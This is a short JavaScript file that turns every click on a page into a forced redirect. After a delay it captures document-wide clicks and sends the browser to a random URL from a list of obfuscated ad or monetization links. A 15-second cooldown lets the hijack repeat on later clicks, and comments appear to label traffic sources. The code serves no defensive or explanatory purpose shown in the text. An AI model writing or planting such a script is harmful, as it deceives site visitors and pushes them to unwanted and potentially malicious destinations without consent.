function init() {
  var arr = [
    // // hil: Jacklove (bit)
    // "https://indolent-ability.com/bw3_V/0.Pw3/pivcb/m_VHJxZdDs0O1MM/zegVxSMmDbAhw/LfT/UhzUOMDCEZwiMiDrEX",
    // "https://indolent-ability.com/b.3eVx0OPv3apGvKbumgV/JRZIDp0x1-Mhzpgix/MoDrA/4fL/TwUeziOxDtExwgMzDakN",
    // "https://indolent-ability.com/bk3/V.0nPl3/pYvlbJmSVqJtZKDs0E1FMCzPg/xLMlDFEh2jLzT/U-zPOqD/Eww/MKTNcY",

    // // hil: Jacklove (wd)
    // "https://indolent-ability.com/b.3fVC0/Pe3epGvIbtmbVsJoZcDm0_1tNjD/cmwbNJDQcr4YLgTiU/0QN_zCA/0tNNzkkq",
    // "https://indolent-ability.com/bl3/V.0YPy3Pp/vPbzmMVBJNZUDm0/1DN/D_cWwYNUD/g/2sL/TKUd0yN-zRAl0dOLDVcW",
    // "https://indolent-ability.com/bT3KV.0BP/3/pxvWbsmYV/J/ZwDe0E1nNBDCccwxNXDMkw0/LCTiU/0ZN/zgAm0LOXT/UV",

    // // hil: Jacklove (wd)
    // "https://indolent-ability.com/bA3.V/0CPW3FpIvVbrm/V/JoZTDA0e1INADNc/wSNnjAcz2ILXTuUZ0lNYzlAV2kNGzlcj",

    // hil: Michael(yy) 
    "https://ruddy-boyfriend.com/b/3-Ve0.PI3WpTvtbpmEVNJ/ZADS0E1UNlD/cyw/OgDrYK0_LbTcUS0iNwzlAU4/N/jjUf",

    // mon: db
    "https://teksishe.net/4/7420698",
    // "https://vaikijie.net/4/7237921",
    // "https://aigheebsu.net/4/7420696",
    // "https://groulrob.com/4/7237907",
    // "https://fodsoack.com/4/7420689",
    // "https://choufauphik.net/4/7474716",
  ];
 
  var didOpen = false;
  document.addEventListener("click", function() {
    if (didOpen) {
      return;
    }
    didOpen = true;
    setTimeout(() => {
      didOpen = false;
    }, 15000);

    var randomIndex = Math.floor(Math.random() * arr.length);
    var randomLink = arr[randomIndex];
    window.location.href = randomLink;
  });
}

setTimeout(() => {
  init();
}, 1000);